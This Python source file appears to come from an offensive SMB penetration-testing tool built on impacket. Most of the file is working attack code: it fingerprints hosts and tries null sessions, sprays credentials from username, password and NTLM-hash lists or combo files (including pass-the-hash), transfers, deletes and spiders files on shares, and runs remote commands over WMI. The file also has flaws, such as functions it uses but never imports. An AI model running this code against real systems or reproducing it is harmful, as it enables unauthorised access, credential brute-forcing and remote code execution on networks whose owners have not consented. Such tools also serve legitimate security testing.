from core.utils import shutdown
from core.logger import *
from impacket.nmb import NetBIOSError
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5.rpcrt import DCERPCException
from core.scripts.wmiexec import WMIEXEC
from time import time
import os
import socket
import StringIO
import settings
import traceback
import socket
import csv

def connect(host):
    try:

        smb = SMBConnection(host, host, None, settings.args.port)
        try:
            smb.login('' , '')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.message:
                pass

        domain = settings.args.domain
        s_name = smb.getServerName()
        if not domain:
            domain = smb.getServerDomain()
            if not domain:
                domain = s_name

        print_status("{}:{} is running {} (name:{}) (domain:{})".format(host, settings.args.port, smb.getServerOS(), s_name, domain))

        '''
        DC's seem to want us to logoff first
        Workstations sometimes reset the connection, so we handle both cases here
        '''
        try:
            smb.logoff()
        except NetBIOSError:
            pass
        except socket.error:
            smb = SMBConnection(host, host, None, settings.args.port)

        if (settings.args.user is not None and (settings.args.passwd is not None or settings.args.hash is not None)) or settings.args.combo_file:

            smb = smart_login(host, smb, domain)

            noOutput = False
            local_ip = smb.getSMBServer().get_socket().getsockname()[0]

            if settings.args.download:
                out = open(settings.args.download.split('\\')[-1], 'wb')
                smb.getFile(settings.args.share, settings.args.download, out.write)
                print_succ("{}:{} {} Downloaded file".format(host, settings.args.port, s_name))

            if settings.args.delete:
                smb.deleteFile(settings.args.share, settings.args.delete)
                print_succ("{}:{} {} Deleted file".format(host, settings.args.port, s_name))

            if settings.args.upload:
                up = open(settings.args.upload[0] , 'rb')
                smb.putFile(settings.args.share, settings.args.upload[1], up.read)
                print_succ("{}:{} {} Uploaded file".format(host, settings.args.port, s_name))

            if settings.args.list:
                if settings.args.list == '' or settings.args.list == '.' : 
                    settings.args.list = '*'
                else:
                    settings.args.list = settings.args.list + '/*'

                dir_list = smb.listPath(settings.args.share, settings.args.list)
                if settings.args.list == '*':
                    settings.args.list = settings.args.share
                else:
                    settings.args.list = settings.args.share + '/' + settings.args.list[:-2]

                print_succ("{}:{} Contents of {}:".format(host, settings.args.port, settings.args.list))
                for f in dir_list:
                    print_att("{}rw-rw-rw- {:>7} {} {}".format('d' if f.is_directory() > 0 else '-', 
                                                             f.get_filesize(),
                                                             strftime('%Y-%m-%d %H:%M', localtime(f.get_mtime_epoch())), 
                                                             f.get_longname()))

            if settings.args.spider:
                start_time = time()
                print_status("{}:{} {} Started spidering".format(host, settings.args.port, s_name))
                spider(smb, host, settings.args.share, settings.args.spider, settings.args.pattern, settings.args.depth)
                print_status("{}:{} {} Done spidering (Completed in {})".format(host, settings.args.port, s_name, time() - start_time))

            if settings.args.command:
                if settings.args.execm == 'wmi':
                        executer = WMIEXEC(settings.args.command, settings.args.user, settings.args.passwd, domain, settings.args.hash, settings.args.aesKey, settings.args.share, noOutput, settings.args.kerb)
                        executer.run(host)

        try:
            smb.logoff()
        except:
            pass

    except SessionError as e:
        print_error("{}:{} {}".format(host, settings.args.port, e))
        if settings.args.verbose: traceback.print_exc()

    except NetBIOSError as e:
        print_error("{}:{} NetBIOS Error: {}".format(host, settings.args.port, e))
        if settings.args.verbose: traceback.print_exc()

    except DCERPCException as e:
        print_error("{}:{} DCERPC Error: {}".format(host, settings.args.port, e))
        if settings.args.verbose: traceback.print_exc()

    except socket.error as e:
        if settings.args.verbose: print_error(str(e))
        return

def smart_login(host, smb, domain):
    if settings.args.combo_file:
        with open(settings.args.combo_file, 'r') as combo_file:
            for line in combo_file:
                try:
                    line = line.strip()

                    lmhash = ''
                    nthash = ''

                    if '\\' in line:
                        domain, user_pass = line.split('\\')
                    else:
                        user_pass = line

                    '''
                    Here we try to manage two cases: if an entry has a hash as the password,
                    or if the plain-text password contains a ':'
                    '''
                    if len(user_pass.split(':')) == 3:
                        hash_or_pass = ':'.join(user_pass.split(':')[1:3]).strip()

                        #Not the best way to determine of it's an NTLM hash :/
                        if len(hash_or_pass) == 65 and len(hash_or_pass.split(':')[0]) == 32 and len(hash_or_pass.split(':')[1]) == 32:
                            lmhash, nthash = hash_or_pass.split(':')
                            passwd = hash_or_pass
                            user = user_pass.split(':')[0]

                    elif len(user_pass.split(':')) == 2:
                        user, passwd = user_pass.split(':')

                    try:
                        smb.login(user, passwd, domain, lmhash, nthash)
                        print_succ("{}:{} Login successful {}\\{}:{}".format(host, settings.args.port, domain, user, passwd))
                        return smb
                    except SessionError as e:
                        print_error("{}:{} {}\\{}:{} {}".format(host, settings.args.port, domain, user, passwd, e))
                        continue

                except Exception as e:
                    print_error("Error parsing line '{}' in combo file: {}".format(line, e))
                    continue
    else:
        usernames = []
        passwords = []
        hashes    = []

        if settings.args.user is not None:
            if os.path.exists(settings.args.user):
                usernames = open(settings.args.user, 'r')
            else:
                usernames = settings.args.user.split(',')

        if settings.args.passwd is not None:
            if os.path.exists(settings.args.passwd):
                passwords = open(settings.args.passwd, 'r')
            else:
                '''
                You might be wondering: wtf is this? why not use split()?
                This is in case a password contains a comma! we can use '\\' to make sure it's parsed correctly
                IMHO this is a much better way than writing a custom split() function
                '''
                try:
                    passwords = csv.reader(StringIO.StringIO(settings.args.passwd), delimiter=str(','), escapechar=str('\\')).next()
                except StopIteration:
                    #in case we supplied only '' as the password (null session)
                    passwords = ['']

        if settings.args.hash is not None:
            if os.path.exists(settings.args.hash):
                hashes = open(settings.args.hash, 'r')
            else:
                hashes = settings.args.hash.split(',')

        for user in usernames:
            user = user.strip()

            try:
                hashes.seek(0)
            except AttributeError:
                pass

            try:
                passwords.seek(0)
            except AttributeError:
                pass

            if hashes:
                for ntlm_hash in hashes:
                    ntlm_hash = ntlm_hash.strip().lower()
                    lmhash, nthash = ntlm_hash.split(':')
                    if user == '': user = "''"

                    try:
                        smb.login(user, '', domain, lmhash, nthash)
                        print_succ("{}:{} Login successful {}\\{}:{}".format(host, settings.args.port, domain, user, ntlm_hash))
                        return smb
                    except SessionError as e:
                        print_error("{}:{} {}\\{}:{} {}".format(host, settings.args.port, domain, user, ntlm_hash, e))
                        continue

            if passwords:
                for passwd in passwords:
                    passwd = passwd.strip()
                    if user == '': user = "''"
                    if passwd == '': passwd = "''"

                    try:
                        smb.login(user, passwd, domain)
                        print_succ("{}:{} Login successful {}\\{}:{}".format(host, settings.args.port, domain, user, passwd))
                        return smb
                    except SessionError as e:
                        print_error("{}:{} {}\\{}:{} {}".format(host, settings.args.port, domain, user, passwd, e))
                        continue

    raise socket.error